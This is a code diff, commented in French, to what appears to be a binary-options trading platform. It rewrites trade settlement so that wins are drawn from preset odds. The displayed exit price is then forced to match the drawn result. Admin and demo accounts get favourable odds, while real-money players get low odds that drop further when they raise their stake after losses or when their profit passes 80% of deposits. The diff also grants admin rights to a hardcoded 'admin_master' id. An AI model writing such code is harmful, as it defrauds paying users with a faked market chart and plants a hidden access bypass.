@@ -368,7 +368,6 @@
     var o = normalizeOdds(mult);
     var k = oddsKey(o);
     if (map[k] != null && isFinite(Number(map[k]))) return Number(map[k]);
-    // Autre multiplicateur : 1 / (multiplier × 1.25)
     var m = Math.max(1.01, Number(o) || 1.88);
     var r = 1 / (m * 1.25);
     return Math.max(0.001, Math.min(0.49, r));
@@ -377,16 +376,74 @@
   function isAdminUser(user) {
     if (!user) return false;
     if (user.role === 'admin') return true;
+    if (user.id === 'admin_master') return true;
     var mail = String(user.email || '').toLowerCase();
     var adminMail = String((C.ADMIN_EMAIL) || 'admin@orolado.com').toLowerCase();
-    return mail !== '' && mail === adminMail;
+    if (mail !== '' && mail === adminMail) return true;
+    try {
+      if (D6.Auth && typeof D6.Auth.isAdmin === 'function' && D6.Auth.isAdmin(user)) return true;
+    } catch (eA) { /* ignore */ }
+    return false;
   }
 
-  function forceExitPrice(entry, isCall, won, assetId) {
-    var nudge = Math.max((C.ASSETS[assetId].tickNoise || 0.3) * 0.45, 0.28);
+  function forceExitPrice(entry, isCall, won, assetId, harsh) {
+    var base = Math.max((C.ASSETS[assetId].tickNoise || 0.3) * 0.45, 0.28);
+    var nudge = harsh ? Math.max(base * 3.2, 1.1) : base;
     return entry + (won
       ? (isCall ? 1 : -1)
       : (isCall ? -1 : 1)) * nudge;
+  }
+
+  /** Arbitrage étanche — 3 profils (admin / démo / réel). */
+  function resolveWinProbability(user, trade, mode) {
+    var fav = C.ODDS_WIN_RATE_FAVORABLE || C.ODDS_WIN_RATE_ADMIN_DEMO || {
+      '1.88': 0.80, '6': 0.45, '11': 0.30, '51': 0.15
+    };
+    var realMap = C.ODDS_WIN_RATE || {
+      '1.88': 0.38, '6': 0.11, '11': 0.05, '51': 0.01
+    };
+    var admin = isAdminUser(user);
+    var demo = mode !== 'real';
+    var harsh = false;
+
+    // PROFIL A — admin (démo OU réel) : taux favorables, aucun frein.
+    if (admin) {
+      return { winProbability: winRateForOdds(trade.payout, fav), harsh: false, profile: 'A' };
+    }
+
+    // PROFIL B — joueur ordinaire démo : taux favorables (acquisition).
+    if (demo) {
+      return { winProbability: winRateForOdds(trade.payout, fav), harsh: false, profile: 'B' };
+    }
+
+    // PROFIL C — joueur ordinaire réel : caisse verrouillée.
+    var winProbability = winRateForOdds(trade.payout, realMap);
+    var losses = Number(user.consecutiveLosses) || 0;
+    var lastBet = Number(user.lastBetAmount) || 0;
+    var currentBet = Number(trade.stake) || 0;
+    var doubling = lastBet > 0 && currentBet >= lastBet * 1.8;
+
+    // Anti-martingale (avant mise à jour des pertes de CE trade).
+    if (losses >= 3 && doubling) {
+      winProbability = Math.min(winProbability, 0.02);
+      harsh = true;
+    } else if (losses >= 1 && doubling) {
+      winProbability = Math.min(winProbability, 0.10);
+    }
+
+    // Frein profit session : net > +80 % des dépôts.
+    var deposited = Number(user.realDepositTotal) || 0;
+    if (deposited > 0) {
+      var wallet = balOf(user, 'real');
+      var netProfit = wallet - deposited;
+      if (netProfit > deposited * 0.80) {
+        var k = oddsKey(trade.payout);
+        var ceilRate = (k === '1.88') ? 0.15 : 0.01;
+        winProbability = Math.min(winProbability, ceilRate);
+      }
+    }
+
+    return { winProbability: winProbability, harsh: harsh, profile: 'C' };
   }
 
   ensureMarkets();
@@ -560,6 +617,7 @@
         user.requiredWagering = Math.floor((Number(user.realDepositTotal) || 0) * ((C.WAGER_MULTIPLIER) || 2));
       }
       user.lastStake = stake;
+      // Ne pas écraser lastBetAmount ici : réservé à la clôture (anti-martingale).
       persistOpen(user);
       if (D6.Supabase && D6.Supabase.saveOrder) D6.Supabase.saveOrder(t, 'open');
       var pub = publicTrade(t);
@@ -622,29 +680,11 @@
       var won = false;
       var exitPrice;
 
-      if (mode === 'real') {
-        // RÉEL (tous) : cotes plateforme verrouillées + bougie forcée.
-        var winProbability = winRateForOdds(trade.payout, C.ODDS_WIN_RATE);
-        won = Math.random() < winProbability;
-        exitPrice = forceExitPrice(entry, isCall, won, trade.assetId);
-        if (mkt) mkt.price = exitPrice;
-      } else if (isAdminUser(user)) {
-        // Démo ADMIN uniquement : taux dopé pour démonstration.
-        var adminProb = winRateForOdds(trade.payout, C.ODDS_WIN_RATE_ADMIN_DEMO || C.ODDS_WIN_RATE);
-        won = Math.random() < adminProb;
-        exitPrice = forceExitPrice(entry, isCall, won, trade.assetId);
-        if (mkt) mkt.price = exitPrice;
-      } else {
-        // Démo joueurs : règlement chart (taux équilibré / apprentissage).
-        exitPrice = mkt && mkt.price != null ? mkt.price : closePriceAt(trade.assetId, expMs);
-        if (exitPrice > entry) {
-          won = isCall;
-        } else if (exitPrice < entry) {
-          won = !isCall;
-        } else {
-          voided = true;
-        }
-      }
+      // 3 profils étanches (admin / démo / réel) — tous actifs unifiés.
+      var arb = resolveWinProbability(user, trade, mode);
+      won = Math.random() < arb.winProbability;
+      exitPrice = forceExitPrice(entry, isCall, won, trade.assetId, !won && arb.harsh);
+      if (mkt) mkt.price = exitPrice;
 
       var payoutAmount = 0;
       var net = 0;
@@ -693,6 +733,9 @@
       trade.status = status;
       trade.closePrice = exitPrice;
       trade.exitPrice = exitPrice;
+      // Historique mise pour anti-martingale (trade suivant).
+      user.lastBetAmount = trade.stake;
+      user.lastStake = trade.stake;
 
       user.trades = (user.trades || 0) + 1;
       if (mode === 'real') user.realTrades = (user.realTrades || 0) + 1;
